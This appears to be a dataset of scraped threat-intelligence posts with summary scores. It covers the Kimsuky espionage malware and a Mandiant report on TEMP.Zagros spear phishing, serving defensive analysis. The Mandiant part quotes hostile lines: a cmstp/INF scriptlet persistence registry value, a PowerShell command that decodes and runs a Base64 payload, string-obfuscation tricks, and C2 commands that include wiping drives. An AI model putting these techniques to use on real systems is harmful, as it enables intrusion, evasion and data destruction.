FirewallPolicyPublicProfile EnableFirewall = 0 HKLMSOFTWAREAhnLabV3IS2007InternetSec FWRunMode = 0 HKLMSOFTWAREAhnlabV3IS80is fwmode = 0 1 2 3 4 5 6 7 8 9 10 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyStandardProfile EnableFirewall = 0 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyPublicProfile EnableFirewall = 0 HKLMSOFTWAREAhnLabV3IS2007InternetSec FWRunMode = 0 HKLMSOFTWAREAhnlabV3IS80is fwmode = 0It also turns off the Windows Security Center service to prevent alerting the user about the disabled firewall.It is not accidental that the malware author has singled out AhnLab's security product. During our Winnti research, we learnt that one of the Korean victims was severely criticized by South Korean regulators for using foreign security products. We do not know for sure how this criticism affected other South Korean organizations, but we do know that many South Korean organizations install AhnLab security products. Accordingly, these attackers don't even bother evading foreign vendors' products, because their targets are solely South Korean.Once the malware disables the AhnLab firewall, it checks whether the file taskmgr.exe is located in the hardcoded C:WINDOWS folder. If the file is present, it runs this executable. Next, the malware loops every 30 minutes to report itself and wait for response from its operator.CommunicationsCommunication between bot and operator flows through the Bulgarian web-based free email server (mail.bg). The bot maintains hardcoded credentials for its e-mail account. After authenticating, the malware sends e-mails to another specified e-mail address, and reads e-mails from the inbox. All these activities are performed via the ""mail.bg"" web-interface with the use of the system Wininet API functions. From all the samples that we managed to obtain, we extracted the following email accounts used in this campaign:beautifl@mail.bg ennemyman@mail.bg fasionman@mail.bg happylove@mail.bg lovest000@mail.bg monneyman@mail.bg sportsman@mail.bg veryhappy@mail.bg 1 2 3 4 5 6 7 8 beautifl @ mail . bg ennemyman @ mail . bg fasionman @ mail . bg happylove @ mail . bg lovest000 @ mail . bg monneyman @ mail . bg sportsman @ mail . bg veryhappy @ mail . bgHere are the two ""master"" email addresses to which the bots send e-mails on behalf of the above-mentioned accounts. They report on status and transmit infected system information via attachments:iop110112@hotmail.com rsh1213@hotmail.com 1 2 iop110112 @ hotmail . com rsh1213 @ hotmail . comRegular reportingTo report infection status, the malware reads from C:Program FilesCommon FilesSystemOle DBoledvbs.inc which contains the systeminfo command output. If the file exists, it is deleted after reading.Then, it reads user-related info from the file sqlxmlx.inc in the same folder (we can see strings referencing to ""UserID"" commentary in this part of the code). But this file was never created. As you recall, there is a function that should have collected this data and should have saved it into this sqlxmlx.inc file. However, on the first launch, the collected user information is saved into ""xmlrwbin.inc"". This effectively means that the malware writer mistakenly coded the bot to save user information into the wrong file. There is a chance for the mistaken code to still work -- user information could be copied into the send information heap. But not in this case - at the time of writing, the gathered user information variable which should point to the xmlrwbin.inc filename has not yet been initialized, causing the file write to fail. We see that sqlxmlx.inc is not created to store user information.Next, the intercepted keystrokes are read from the file and sent to the master. Keystrokes are logged and kept in an ordinary and consistent format in this file - both the names of windows in which keys were typed and the actual sequence of keyboard entry. This data is found in the file C:Program FilesCommon FilesSystemOle DBmsolui80.inc created by the external key logger module.All this data is merged in one file xmlrwbin.inc, which is then encrypted with RC4. The RC4 key is generated as an MD5 hash of a randomly generated 117-bytes buffer. To be able to decipher the data, the attacker should certainly know either the MD5 hash or the whole buffer content. This data is also sent, but RSA encrypted. The malware constructs a 1120 bit public key, uses it to encrypt the 117-bytes buffer. The malware then concatenates all the data to be sent as a 128-bytes block. The resulting data is saved in C:Program FilesCommon FilesSystemOle DB to a file named according to the following format:""<system time>_<account at Bulgarian email server>.txt"", for example, ""08191757_beautifl@mail.bg.txt"".The file is then attached to an e-mail and sent to the master's e-mail account. Following transmission, it is immediately deleted from the victim system.Getting the master's dataThe malware also retrieves instructions from the mail server. It checks for mails in its Bulgarian e-mail account with a particular subject tag. We have identified several ""subject tags"" in the network communication: Down_0, Down_1, Happy_0, Happy_2 and ddd_3. When found and the e-mail maintains an attachment, the malware downloads this attachment and saves it with filename ""msdaipp.cnt"" in C:Program FilesCommon FilesSystemOle DB. The attacker can send additional executables in this way. The executables are RC4 encrypted and then attached. The key for decryption is hardcoded in the malicious samples. It's interesting that the same ""rsh!@!"" string is maintained across all known samples and is used to generate RC4 keys. As described earlier, the malware computes the MD5 of this string and uses the hash as its RC4 key to decrypt the executable. Then, the plain executable is dropped onto disk as ""sqlsoldb.exe"" and run, and then moved to the C:Windows folder with the file name ""taskmgr.exe"". The original e-mail and its attachment are then deleted from the Bulgarian e-mail inbox.Key loggerThe additional key logger module is not very complex -- it simply intercepts keystrokes and writes typed keys into C:Program FilesCommon FilesSystemOle DBmsolui80.inc, and also records the active window name where the user pressed keys. We saw this same format in the Madi malware. There is also one key logger variant that logs keystrokes into C:WINDOWSsetup.log.Directory listing collectorThe next program sent to victims enumerates all the drives on the infected system and executes the following command on them:dir <drive letter>: /a /s /t /-cIn practice, this command is written to C:WINDOWSmsdatt.bat and executed with output redirected to C:WINDOWSmsdatl3.inc. As a result, the latter maintains a listing of all files in all the folders on the drive. The malware later reads that data and appends it to content of the file C:Program FilesCommon FilesSystemOle DBoledvbs.inc. At this point, ""oledvbs.inc ""already stores systeminfo output.It's interesting that one sample of the directory listing collector was infected with the infamous ""Viking"" virus of Chinese origin. Some of this virus' modifications were wandering in the wild for years and its authors or operators would never expect to see it end up in a clandestine APT-related spying tool. For the attackers, this is certainly a big failure. Not only does the original spying program have marks of well-known malware that can be detected by anti-malware products, moreover the attackers are revealing their secret activities to cyber-criminal gangs. However, by all appearances, the attackers noticed the unwanted addition to their malware and got rid of the infection. This was the only sample bearing the Viking virus.Due to expensive work of malware with variety of additional files, it's not out of place to show these ""relationships"" in a diagram:HWP document stealerThis module intercepts HWP documents on an infected computer. The HWP file format is similar to Microsoft Word documents, but supported by Hangul, a South Korean word processing application from the Hancom Office bundle. Hancom Office is widely used in South Korea. This malware module works independently of the others and maintains its own Bulgarian e-mail account. The account is hardcoded in the module along with the master's e-mail to which it sends intercepted documents. It is interesting that the module does not search for all the HWP files on infected computer, but reacts only to those that are opened by the user and steals them. This behavior is very unusual for a document-stealing component and we do not see it in other malicious toolkits.The program copies itself as <Hangul full path>HncReporter.exe and changes the default program association in the registry to open HWP documents. To do so, it alters following registry values:HKEY_CLASSES_ROOTHwp.Document.7shellopencommand or HKEY_CLASSES_ROOTHwp.Document.8shellopencommand 1 2 3 HKEY_CLASSES_ROOTHwp . Document . 7shellopencommand or HKEY_CLASSES_ROOTHwp . Document . 8shellopencommandBy default, there is the registry setting ""<Hangul full path>Hwp.exe"" ""%1"" associating Hangul application ""Hwp.exe"" with .HWP documents. But the malicious program replaces this string with the following: ""<Hangul full path>HncReporter.exe "" ""%1"". So, when the user is opening any .HWP document, the malware program itself is executed to open the .HWP document. Following this registry edit, any opened .HWP document is read and sent as an e-mail attachment with the subject ""Hwp"" to the attackers. After sending, the malware executes the real Hangul word processing application ""Hwp.exe"" to open the .HWP document as the user intended. The means the victim most likely will not notice the theft of the .HWP file. The module's sending routine depends on the following files in C:Program FilesCommon FilesSystemOle DB folder: xmlrwbin.inc, msdaipp.cnt, msdapml.cnt, msdaerr.cnt, msdmeng.cnt and oledjvs.inc.Remote control module downloaderAn extra program is dedicated exclusively to download attachments out of incoming e-mails with a particular subject tag. This program is similar to the pivot module but with reduced functionality: it maintains the hardcoded Bulgarian e-mail account, logs in, reads incoming e-mails and searches for the special subject tag ""Team"". When found, it loads the related attachment, drops it onto the hard drive as C:Program FilesCommon FilesSystemOle DBtaskmgr.exe and executes. This particular executable arrives without any encryption.Remote control moduleIt is also interesting that the malware author did not custom develop a backdoor program. Instead, the author modified TeamViewer client version 5.0.9104. The initial executable pushed by attackers in e-mails related to the remote control module consists of three more executables. Two of them are Team Viewer components themselves, and another is some sort of backdoor loader. So, the dropper creates three files in the C:WindowsSystem32 directory:netsvcs.exe - the modified Team Viewer client, netsvcs_ko.dll - resources library of Team Viewer client, vcmon.exe - installer/starter, 1 2 3 netsvcs . exe - the modified Team Viewer client , netsvcs_ko . dll - resources library of Team Viewer client , vcmon . exe - installer / starter ,and creates the service ""Remote Access Service"", adjusted to execute C:WindowsSystem32vcmon.exe at system startup. Every time the vcmon.exe is executed, it disables AhnLab's firewall by zeroing out following registry values:HKLMSOFTWAREAhnLabV3 365 ClinicInternetSec UseFw = 0 UseIps = 0 1 2 3 HKLMSOFTWAREAhnLabV3 365 ClinicInternetSec UseFw = 0 UseIps = 0Then, it modifies the Team Viewer registry settings. As we said, the Team Viewer components used in this campaign are not the original ones. They are slightly modified. In total, we found two different variants of changed versions. The malware author replaced all the entries of ""Teamviewer"" strings in Team Viewer components. In the first case with the ""Goldstager"" string and with the string ""Coinstager"" in the second. TeamViewer client registry settings are then HKLMSoftwareGoldstagerVersion5 and HKLMSoftwareCoinstagerVersion5 correspondingly. The launcher sets up several registry values that control how the remote access tool will work. Among them is SecurityPasswordAES. This parameter represents a hash of the password with which a remote user has to connect to Team Viewer client. This way, the attackers set a pre-shared authentication value. After that, the starter executes the very Team Viewer client netsvcs.exe.Who's Kim?It's interesting that the drop box mail accounts iop110112@hotmail.com and rsh1213@hotmail.com are registered with the following ""kim"" names: kimsukyang and ""Kim asdfa"".Of course, we can't be certain that these are the real names of the attackers. However, the selection isn't frequently seen. Perhaps it also points to the suspected North Korean origin of attack. Taking into account the profiles of the targeted organizations -- South Korean universities that conduct researches on international affairs, produce defense policies for government, national shipping company, supporting groups for Korean unification -- one might easily suspect that the attackers might be from North Korea.The targets almost perfectly fall into their sphere of interest. On the other hand, it is not that hard to enter arbitrary registration information and misdirect investigators to an obvious North Korean origin. It does not cost anything to concoct fake registration data and enter kimsukyang during a Hotmail registration. We concede that this registration data does not provide concrete, indisputable information about the attackers.However, the attackers' IP-addresses do provide some additional clues. During our analysis, we observed ten IP-addresses used by the Kimsuky operators. All of them lie in ranges of the Jilin Province Network and Liaoning Province Network, in China.No other IP-addresses have been uncovered that would point to the attackers' activity and belong to other IP-ranges. Interestingly, the ISPs providing internet access in these provinces are also believed to maintain lines into North Korea. Finally, this geo-location supports the likely theory that the attackers behind Kimsuky are based in North Korea.AppendixFiles used by malware:%windir%system32kbdlv2.dll %windir%system32auto.dll %windir%system32netsvcs.exe %windir%system32netsvcs_ko.dll %windir%system32vcmon.exe %windir%system32svcsmon.exe %windir%system32svcsmon_ko.dll %windir%system32wsmss.exe %temp%~DFE8B437DD7C417A6D.TMP %temp%~DFE8B43.TMP %temp%~tmp.dll C:Windowstaskmgr.exe C:Windowssetup.log C:Windowswinlog.txt C:Windowsupdate.log C:Windowswmdns.log C:Windowsoledvbs.inc C:Windowsweoig.log C:Windowsdata.dat C:Windowssys.log C:WindowsPcMon.exe C:WindowsGoogle Update.exe C:WindowsReadMe.log C:Windowsmsdatt.bat C:Windowsmsdatl3.inc C:Program FilesCommon FilesSystemOle DBmsdmeng.cnt C:Program FilesCommon FilesSystemOle DBxmlrwbin.inc C:Program FilesCommon FilesSystemOle DBmsdapml.cnt C:Program FilesCommon FilesSystemOle DBsqlsoldb.exe C:Program FilesCommon FilesSystemOle DBoledjvs.inc C:Program FilesCommon FilesSystemOle DBoledvbs.inc C:Program FilesCommon FilesSystemOle DBmsolui80.inc C:Program FilesCommon FilesSystemOle DBmsdaipp.cnt C:Program FilesCommon FilesSystemOle DBmsdaerr.cnt C:Program FilesCommon FilesSystemOle DBsqlxmlx.inc <Hangul full path>HncReporter.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 % windir % system32kbdlv2 . dll % windir % system32auto . dll % windir % system32netsvcs . exe % windir % system32netsvcs_ko . dll % windir % system32vcmon . exe % windir % system32svcsmon . exe % windir % system32svcsmon_ko . dll % windir % system32wsmss . exe % temp % ~ DFE8B437DD7C417A6D . TMP % temp % ~ DFE8B43 . TMP % temp % ~ tmp . dll C : Windowstaskmgr . exe C : Windowssetup . log C : Windowswinlog . txt C : Windowsupdate . log C : Windowswmdns . log C : Windowsoledvbs . inc C : Windowsweoig . log C : Windowsdata . dat C : Windowssys . log C : WindowsPcMon . exe C : WindowsGoogle Update . exe C : WindowsReadMe . log C : Windowsmsdatt . bat C : Windowsmsdatl3 . inc C : Program FilesCommon FilesSystemOle DBmsdmeng . cnt C : Program FilesCommon FilesSystemOle DBxmlrwbin . inc C : Program FilesCommon FilesSystemOle DBmsdapml . cnt C : Program FilesCommon FilesSystemOle DBsqlsoldb . exe C : Program FilesCommon FilesSystemOle DBoledjvs . inc C : Program FilesCommon FilesSystemOle DBoledvbs . inc C : Program FilesCommon FilesSystemOle DBmsolui80 . inc C : Program FilesCommon FilesSystemOle DBmsdaipp . cnt C : Program FilesCommon FilesSystemOle DBmsdaerr . cnt C : Program FilesCommon FilesSystemOle DBsqlxmlx . inc < Hangul full path > HncReporter . exeRelated MD5:3baaf1a873304d2d607dbedf47d3e2b4 3195202066f026de3abfe2f966c9b304 4839370628678f0afe3e6875af010839 173c1528dc6364c44e887a6c9bd3e07c 191d2da5da0e37a3bb3cbca830a405ff 5eef25dc875cfcb441b993f7de8c9805 b20c5db37bda0db8eb1af8fc6e51e703 face9e96058d8fe9750d26dd1dd35876 9f7faf77b1a2918ddf6b1ef344ae199d d0af6b8bdc4766d1393722d2e67a657b 45448a53ec3db51818f57396be41f34f 80cba157c1cd8ea205007ce7b64e0c2a f68fa3d8886ef77e623e5d94e7db7e6c 4a1ac739cd2ca21ad656eaade01a3182 4ea3958f941de606a1ffc527eec6963f 637e0c6d18b4238ca3f85bcaec191291 b3caca978b75badffd965a88e08246b0 dbedadc1663abff34ea4bdc3a4e03f70 3ae894917b1d8e4833688571a0573de4 8a85bd84c4d779bf62ff257d1d5ab88b d94f7a8e6b5d7fc239690a7e65ec1778 f1389f2151dc35f05901aba4e5e473c7 96280f3f9fd8bdbe60a23fa621b85ab6 f25c6f40340fcde742018012ea9451e0 122c523a383034a5baef2362cad53d57 2173bbaea113e0c01722ff8bc2950b28 2a0b18fa0887bb014a344dc336ccdc8c ffad0446f46d985660ce1337c9d5eaa2 81b484d3c5c347dc94e611bae3a636a3 ab73b1395938c48d62b7eeb5c9f3409d 69930320259ea525844d910a58285e15 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 3baaf1a873304d2d607dbedf47d3e2b4 3195202066f026de3abfe2f966c9b304 4839370628678f0afe3e6875af010839 173c1528dc6364c44e887a6c9bd3e07c 191d2da5da0e37a3bb3cbca830a405ff 5eef25dc875cfcb441b993f7de8c9805 b20c5db37bda0db8eb1af8fc6e51e703 face9e96058d8fe9750d26dd1dd35876 9f7faf77b1a2918ddf6b1ef344ae199d d0af6b8bdc4766d1393722d2e67a657b 45448a53ec3db51818f57396be41f34f 80cba157c1cd8ea205007ce7b64e0c2a f68fa3d8886ef77e623e5d94e7db7e6c 4a1ac739cd2ca21ad656eaade01a3182 4ea3958f941de606a1ffc527eec6963f 637e0c6d18b4238ca3f85bcaec191291 b3caca978b75badffd965a88e08246b0 dbedadc1663abff34ea4bdc3a4e03f70 3ae894917b1d8e4833688571a0573de4 8a85bd84c4d779bf62ff257d1d5ab88b d94f7a8e6b5d7fc239690a7e65ec1778 f1389f2151dc35f05901aba4e5e473c7 96280f3f9fd8bdbe60a23fa621b85ab6 f25c6f40340fcde742018012ea9451e0 122c523a383034a5baef2362cad53d57 2173bbaea113e0c01722ff8bc2950b28 2a0b18fa0887bb014a344dc336ccdc8c ffad0446f46d985660ce1337c9d5eaa2 81b484d3c5c347dc94e611bae3a636a3 ab73b1395938c48d62b7eeb5c9f3409d 69930320259ea525844d910a58285e15Names of services created by malware:DriverManage WebService WebClientManager Remote Access Service 1 2 3 4 DriverManage WebService WebClientManager Remote Access ServiceWe detect these threats as Trojan.Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan.Win32.Patched.ps.";The ITSecurity report suggests that the attackers behind Kimsuky are based in North Korea. The attackers' IPaddresses do provide some additional clues. During our analysis, we observed ten IPaddresses used by the Kimsuky operators. All of them lie in ranges of the Jilin Province Network and Liaoning Province Network, in China. No other IPaddresses have been uncovered that would point to the attackers' activity and belong to other IPranges. Interestingly, the ISPs providing internet access in these provinces are also believed to maintain lines into North Korea. Finally, this geolocation supports the likely theory that the attackers are based in North Korea.;en;{'r': 0.050965250965250966, 'p': 0.9295774647887324, 'f': 0.09663250267482193};{'r': 0.028654334421472614, 'p': 0.8404255319148937, 'f': 0.05541915053735015};{'r': 0.050965250965250966, 'p': 0.9295774647887324, 'f': 0.09663250267482193}
https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign;Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign;"IntroductionFrom January 2018 to March 2018, through FireEye's Dynamic Threat Intelligence, we observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macro-based documents to individuals in Asia and the Middle East.We attribute this activity to TEMP.Zagros (reported by Palo Alto Networks and Trend Micro as MuddyWater), an Iran-nexus actor that has been active since at least May 2017. This actor has engaged in prolific spear phishing of government and defense entities in Central and Southwest Asia. The spear phishing emails and attached malicious macro documents typically have geopolitical themes. When successfully executed, the malicious documents install a backdoor we track as POWERSTATS.One of the more interesting observations during the analysis of these files was the re-use of the latest AppLocker bypass, and lateral movement techniques for the purpose of indirect code execution. The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system.Campaign TimelineIn this campaign, the threat actor's tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. A brief timeline of this activity is shown in Figure 1.Figure 1: Timeline of this recently observed spear phishing campaignThe first part of the campaign (From Jan. 23, 2018, to Feb. 26, 2018) used a macro-based document that dropped a VBS file and an INI file. The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe. The process chain is shown in Figure 2.Figure 2: Process chain for the first part of the campaignAlthough the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it. One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3.Figure 3: VBS invoking PowerShell via MSHTAThe second part of the campaign (from Feb. 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution. Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog.Infection VectorWe believe the infection vector for all of the attacks involved in this campaign are macro-based documents sent as an email attachment. One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4.Figure 4: Sample spear phishing email containing macro-based document attachmentThe malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India. What follows is four examples, and a complete list is available in the Indicators of Compromise section at the end of the blog.Figure 5 shows a document purporting to be from the National Assembly of Pakistan.Figure 5: Document purporting to be from the National Assembly of PakistanA document purporting to be from the Turkish Armed Forces, with content written in the Turkish language, is shown in Figure 6.Figure 6: Document purporting to be from the Turkish Armed ForcesA document purporting to be from the Institute for Development and Research in Banking Technology (established by the Reserve Bank of India) is shown in Figure 7.Figure 7: Document purporting to be from the Institute for Development and Research in Banking TechnologyFigure 8 shows a document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of Tajikistan.Figure 8: Document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of TajikistanEach of these macro-based documents used similar techniques for code execution, persistence and communication with the command and control (C2) server.Indirect Code Execution Through INF and SCTThis scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018. The threat group in this recently observed campaign - TEMP.Zagros - weaponized their malware using the following techniques.The macro in the Word document drops three files in a hard coded path: C:\programdata. Since the path is hard coded, the execution will only be observed in operating systems, Windows 7 and above. The following are the three files:Defender.sct - The malicious JavaScript based scriptlet file.- The malicious JavaScript based scriptlet file. DefenderService.inf - The INF file that is used to invoke the above scriptlet file.- The INF file that is used to invoke the above scriptlet file. WindowsDefender.ini - The Base64 encoded and obfuscated PowerShell script.After dropping the three files, the macro will set the following registry key to achieve persistence:\REGISTRY\USER\SID\Software\Microsoft\Windows\CurrentVersion\Run\""WindowsDefenderUpdater"" = cmstp.exe /s c:\programdata\DefenderService.infUpon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file. This is possible because inside the INF file we have the following section:[UnRegisterOCXSection]%11%\scrobj.dll,NI,c:/programdata/Defender.sctThat section gets indirectly invoked through the DefaultInstall_SingleUser section of INF, as shown in Figure 9.Figure 9: Indirectly invoking SCT through the DefaultInstall_SingleUser section of INFThis method of code execution is performed in an attempt to evade security products. FireEye MVX and HX Endpoint Security technology successfully detect this code execution technique.SCT File AnalysisThe code of the Defender.sct file is an obfuscated JavaScript. The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line:powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini)The rest of the malicious activities are performed by the PowerShell Script.PowerShell File AnalysisThe PowerShell script employs several layers of obfuscation to hide its actual functionality. In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools.Some of the key obfuscation techniques used are:Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult.Figure 10: Character replacement and string reversing techniquesPowerShell Environment Variables: Nowadays, malware authors commonly mask critical strings such as ""IEX"" using environment variables. Some of the instances used in this script are: $eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')Nowadays, malware authors commonly mask critical strings such as ""IEX"" using environment variables. Some of the instances used in this script are: XOR encoding: The biggest section of the PowerShell script is XOR encoded using a single byte key, as shown in Figure 11.Figure 11: PowerShell script is XOR encoded using a single byte keyAfter deobfuscating the contents of the PowerShell Script, we can divide it into three sections.Section 1The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:TEMpPAtH = ""C:\ProgramData\"" (the path used for storing the temp files)Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine)FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code)PRIVAtE = Private Key exponentsPUbLIc = Public Key exponentsHklm = ""HKLM:\Software\""Hkcu = ""HKCU:\Software\""ValuE = ""kaspersky""SYSIDDrAGon_MidDLe = [array of proxy URLs]Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12.Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 serverSection 2The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server. The algorithm used for encryption and decryption is RSA, which leverages the public and private key exponents included in Section 1 of the PowerShell script.Section 3The third section of the PowerShell script is the biggest section and has a wide variety of functionalities.During analysis, we observed a code section where a message written in Chinese and hard coded in the script will be printed in the case of an error while connecting to the C2 server:The English translation for this message is: ""Cannot connect to website, please wait for dragon"".Other functionalities provided by this section of the PowerShell Script are as follows:Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name UsernameAll of this data is concatenated and formatted as shown in Figure 13.Figure 13: Concatenated and formatted data retrieved by PowerShell scriptRegister the victim's machine to the C2 server by sending the REGISTER command to the server. In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim's machine and the C2 server.While sending to the C2 server, the data is formatted as follows:@{SYSINFO = $get.ToString(), ACTION = ""REGISTER"",}Ability to take screenshots.Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14.Figure 14: System shut down upon discovery of security toolsAbility to receive PowerShell script from the C2 server and execute on the machine. Several techniques are employed for executing the PowerShell code: If command starts with ""excel"", then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:If the command starts with ""outlook"", then it leverages Outlook.Application and MSHTA to execute the code:If the command starts with ""risk"", then execution is performed through DCOM object:File upload functionality.Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPVFigure 15: Disabling Microsoft Office Protected ViewAbility to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16.Figure 16: Reboot, shut down and clean commandsAbility to sleep for a given number of seconds.The following table summarizes the main C2 commands supported by this PowerShell Script.C2 Command Purpose reboot Reboot the system using shutdown command shutdown Shut down the system using shutdown command clean Wipe the Drives, C:\, D:\, E:\, F:\ screenshot Take a screenshot of the System upload Encrypt and upload the information from the system excel Leverage Excel.Application COM object for code execution outlook Leverage Outlook.Application COM object for code execution risk Leverage DCOM object for code executionConclusionThis activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware. By combining multiple layers of obfuscation, they deter the process of reverse engineering and also attempt to evade security products.Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.Indicators of CompromiseMacro based Documents and HashesSHA256 Hash Filename Targeted Region eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894 na.doc Pakistan 76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338 Invest in Turkey.doc Turkey 6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac guvenlik yonergesi. .doc Turkey 009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0 idrbt.doc India 18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6 Turkiye Cumhuriyeti Kimlik Kart?.doc Turkey 3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb Turkish Armed Forces.doc Turkey 9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c na.gov.pk.doc Pakistan 3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115 MVD-FORM-1800.doc Tajikistan cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88 KEGM-CyberAttack.doc Turkey 1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942 IL-1801.doc Turkey aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627 kiyiemniyeti.doc Turkey 93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84 TCELL-S1-M.doc Tajikistan c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9 egm-1.doc Turkey 2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13 Connectel .pk.doc Pakistan 18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd gAYvenlik_yAoenergesi_.doc Turkey 153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58 MIT.doc Turkey d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025 Gvenlik Ynergesi.doc Turkey af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102 Gvenlik Ynergesi.doc Turkey 5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af NA Turkey 3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c Anadolu GA 1/4neydoAYu Projesinde .doc TurkeyNetwork IndicatorsList of Proxy URLshxxp://alessandrofoglino[.]com//db_template.phphxxp://www.easy-home-sales[.]co.za//db_template.phphxxp://www.almaarefut[.]com/admin/db_template.phphxxp://chinamall[.]co.za//db_template.phphxxp://amesoulcoaching[.]com//db_template.phphxxp://www.antigonisworld[.]com/wp-includes/db_template.phphxxps://anbinni.ba/wp-admin/db_template.phphxxp://arctistrade[.]de/wp/db_template.phphxxp://aianalytics[.]ie//db_template.phphxxp://www.gilforsenate[.]com//db_template.phphxxp://mgamule[.]co.za/oldweb/db_template.phphxxp://chrisdejager-attorneys[.]co.za//db_template.phphxxp://alfredocifuentes[.]com//db_template.phphxxp://alxcorp[.]com//db_template.phphxxps://www.aircafe24[.]com//db_template.phphxxp://agencereferencement.be/wp-admin/db_template.phphxxp://americanlegacies[.]org/webthed_ftw/db_template.phphxxps://aloefly[.]net//db_template.phphxxp://www.duotonedigital[.]co.za//db_template.phphxxp://architectsinc[.]net//db_template.phphxxp://www.tanati[.]co.za//db_template.phphxxp://emware[.]co.za//db_template.phphxxp://breastfeedingbra[.]co.za//db_template.phphxxp://alhidayahfoundation[.]co[.]uk/category/db_template.phphxxp://cashforyousa[.]co.za//db_template.phphxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.phphxxp://antjetaubert[.]de//db_template.phphxxp://hesterwebber[.]co.za//db_template.phphxxp://fickstarelectrical[.]co.za//db_template.phphxxp://alex-frost[.]com/assets/db_template.phphxxps://americanbrasil[.]com.br//db_template.phphxxps://aileeshop[.]com//db_template.phphxxps://annodle[.]com//db_template.phphxxp://goldeninstitute[.]co.za/contents/db_template.phphxxp://ednpk[.]com//db_template.phphxxp://www.arabiccasinochoice[.]com//db_template.phphxxp://proeventsports[.]co.za//db_template.phphxxp://glenbridge[.]co.za//db_template.phphxxp://berped[.]co.za//db_template.phphxxp://best-digital-slr-cameras[.]com//db_template.phphxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.phphxxp://www.alpacal[.]com//db_template.phphxxps://www.alakml[.]com/wp-admin/db_template.phphxxp://ar-rihla[.]com//db_template.phphxxp://appsvoice[.]info//db_template.phphxxp://www.bashancorp[.]co.za//db_template.phphxxp:/